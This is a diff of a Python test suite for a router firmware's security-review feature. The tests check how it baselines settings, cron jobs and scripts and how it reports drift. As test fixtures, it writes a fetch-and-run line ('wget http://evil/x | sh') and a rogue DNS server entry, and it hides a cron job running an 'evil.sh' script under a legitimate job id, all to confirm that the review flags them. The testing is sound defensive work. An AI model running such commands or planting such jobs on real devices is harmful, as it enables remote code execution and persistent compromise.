@@ -163,13 +163,18 @@ try:
     open(os.path.join(binp, "logger"), "w").write('#!/bin/sh\nprintf "%s\\n" "$*" >> "$LOGF"\n')
     for b in ("cru", "logger"): os.chmod(os.path.join(binp, b), 0o755)
 
-    def run(shell, extra=""):
+    # review 2026-10-24 (Q-A-6): the inventory reads its single-line settings through the REAL _nvs (one guarded
+    # `nvram show`, lifted from rc/reaper_nv.h) over a fake nvram built from the fixture files; usleep is the host's sleep
+    NVS = c_unescape(macros_of(read("rc/reaper_nv.h").replace("\\\n", ""))["REAPER_NVS_HELPER"])
+    ok("_nvs() {" in NVS and "nvram show >" in NVS and "REAPER_NVS_HELPER" in rw, "rwatch.sh carries _nvs (reaper_nv.h) and the review's inventory uses it")
+    NVRAM_OK = 'nvram() { case "$1" in show) for f in "$NVDIR"/*; do [ -f "$f" ] || continue; printf "%s=" "${f##*/}"; cat "$f"; echo; done;; get) cat "$NVDIR/$2" 2>/dev/null;; esac; }\n'
+    def run(shell, extra="", nvram_fn=NVRAM_OK):
         base = os.path.join(jffs, "reaper", "review", "baseline")
         # functions, not only PATH stubs: busybox ash in standalone mode runs its own
         # applets (logger, md5sum, awk ...) ahead of PATH, and a function outranks both
-        head = ('_nv() { cat "$NVDIR/$1" 2>/dev/null; }\n'
+        head = ('_nv() { cat "$NVDIR/$1" 2>/dev/null; }\n' + nvram_fn + 'usleep() { sleep 0.02; }\n'
                 'logger() { printf "%s\\n" "$*" >> "$LOGF"; }\n'
-                'cru() { [ "$1" = l ] && cat "$CRU_FILE"; return 0; }\n')
+                'cru() { [ "$1" = l ] && cat "$CRU_FILE"; return 0; }\n' + NVS)
         tail = ('\nRV_JFFS="%s"\nRV_TMP="%s"\nRV_BASE="%s"\n%s\n_rv_run\n' % (jffs, tmpd, base, extra))
         sp = os.path.join(work, "run.sh"); open(sp, "w").write(head + block + tail)
         env = dict(os.environ, NVDIR=nvd, LOGF=logf, CRU_FILE=cruf, LC_ALL="C", PATH=binp + os.pathsep + os.environ.get("PATH", ""))
@@ -233,6 +238,31 @@ try:
         ok(j["armed"] == 1 and j["unreviewed"] == 0 and all(it["st"] == "baseline" for it in j["items"]) and logs == [],
            "[%s] accepted: armed, nothing unreviewed, nothing logged" % tag)
 
+        # 2026-10-24 (owner): a setting this firmware watches that the accepted baseline predates (a baseline taken on an
+        # older firmware) is adopted into it as it stands and logged once - never a change, so an upgrade does not alarm
+        base = os.path.join(jffs, "reaper", "review", "baseline")
+        bl = [l for l in open(base).read().splitlines() if not l.startswith("N\trwarden_dns\t") and not l.startswith("N\tgk_enable\t")]
+        open(base, "w").write("\n".join(bl) + "\n")
+        j, logs = run(shell)
+        bt = open(base).read()
+        ok(j["armed"] == 1 and j["unreviewed"] == 0 and len(logs) == 1 and "now watching 2 setting(s)" in logs[0] and "rwarden_dns" in logs[0] and "gk_enable" in logs[0]
+           and "N\trwarden_dns\t" in bt and "N\tgk_enable\t" in bt and not any(it["st"] == "added" for it in j["items"]),
+           "[%s] a setting the baseline predates is adopted into the baseline and logged once, not reported as a change (got %s / %s)" % (tag, j["unreviewed"], logs))
+        j, logs = run(shell)
+        ok(j["unreviewed"] == 0 and len(logs) == 1, "[%s] ...and the next tick is quiet (the baseline carries it now)" % tag)
+        os.unlink(logf)
+        # 2026-10-25 (_r39 metal: "removed shroud_enable" after the rename): a setting row the baseline has and this firmware
+        # no longer watches is retired from the baseline with one log line - never listed as a change; a removed FILE stays one
+        open(base, "a").write("N\tshroud_enable\t1\n")
+        j, logs = run(shell)
+        bt = open(base).read()
+        ok(j["armed"] == 1 and j["unreviewed"] == 0 and len(logs) == 1 and "no longer watched by this firmware" in logs[0]
+           and "shroud_enable" in logs[0] and "shroud_enable" not in bt and not any(it["st"] == "removed" for it in j["items"]),
+           "[%s] a setting this firmware no longer watches is retired from the baseline and logged once, not a change (got %s / %s)" % (tag, j["unreviewed"], logs))
+        j, logs = run(shell)
+        ok(j["unreviewed"] == 0 and len(logs) == 1, "[%s] ...and the next tick is quiet" % tag)
+        os.unlink(logf)
+
         # drift of every kind
         open(sc, "w").write("#!/bin/sh\nwget http://evil/x | sh\n")                      # S added
         open(os.path.join(jffs, "configs", "dnsmasq.conf.add"), "w").write("log-queries\nserver=1.2.3.4\n")  # S changed
@@ -264,6 +294,19 @@ try:
         accept()
         j, logs = run(shell)
         ok(j["armed"] == 1 and j["unreviewed"] == 0 and not os.path.exists(os.path.join(tmpd, "review.last")), "[%s] re-accept: clean, the log marker is gone" % tag)
+
+        # review 2026-10-24 (S-A-8): a Reaper cron id is skipped only with the command rc installs under it - a line hidden
+        # under such an id is a change like any other
+        open(cruf, "a").write("15 5 * * * sh /usr/sbin/wallguard.sh update #wallguard#\n*/15 * * * * service start_wallguard_policy >/dev/null 2>&1 #wallguard_e2130#\n"
+                              "*/1 * * * * /jffs/addons/x/evil.sh #wallguard_e2359#\n")
+        j, logs = run(shell)
+        ok(j["unreviewed"] == 1 and any(it["t"] == "C" and "evil" in it["k"] and it["st"] == "added" for it in j["items"])
+           and not any(it["t"] == "C" and ("wallguard.sh update" in it["k"] or "start_wallguard_policy" in it["k"]) for it in j["items"]),
+           "[%s] a line hidden under a Reaper cron id is reported; the genuine Reaper jobs stay skipped (got %s)" % (tag, j["unreviewed"]))
+        kept = [l for l in open(cruf).read().splitlines() if "wallguard" not in l]   # read first: open(..., "w") truncates
+        open(cruf, "w").write("".join(l + "\n" for l in kept))
+        j, logs = run(shell)
+        ok(j["unreviewed"] == 0, "[%s] ...and the review is clean again once that line is gone" % tag)
         setnv("rwatch_review", "0")
         j, logs = run(shell)
         ok(j is None and not os.path.exists(os.path.join(tmpd, "review.inv")), "[%s] switch off: the report and the inventory are removed" % tag)
@@ -431,7 +474,7 @@ ok("innerHTML" not in pr and "'rwatch_review'" in dash and "review:'rwatch_revie
 ok("window.RVJ=j; if(typeof paintReview==='function')paintReview();" in dash and "paintReview();" in between(dash, "function paintPosture(){", "\n}\n", "paintPosture"),
    "posture: the row repaints from the bar's poll and on every posture refresh")
 diag = read("others/reaper_diag")
-ok('VER="REAPER-DIAG v1.3.45"' in diag and 'echo "  security review   : rwatch_review=' in diag and 'echo "  threat domains    : rwarden_dns=' in diag,
+ok('VER="REAPER-DIAG v1.3.49"' in diag and 'echo "  security review   : rwatch_review=' in diag and 'echo "  threat domains    : rwarden_dns=' in diag,
    "diag v1.3.45: the review and threat-domain state lines")
 ok("finding WARN \"security review: ${_rvu} unreviewed change(s)" in diag and "finding WARN \"security review: ${_rvn} failed-login burst(s)" in diag
    and "finding WARN \"threat domains are switched on but no list is loaded" in diag, "diag: findings for unreviewed changes, login bursts and an unloaded domain list")
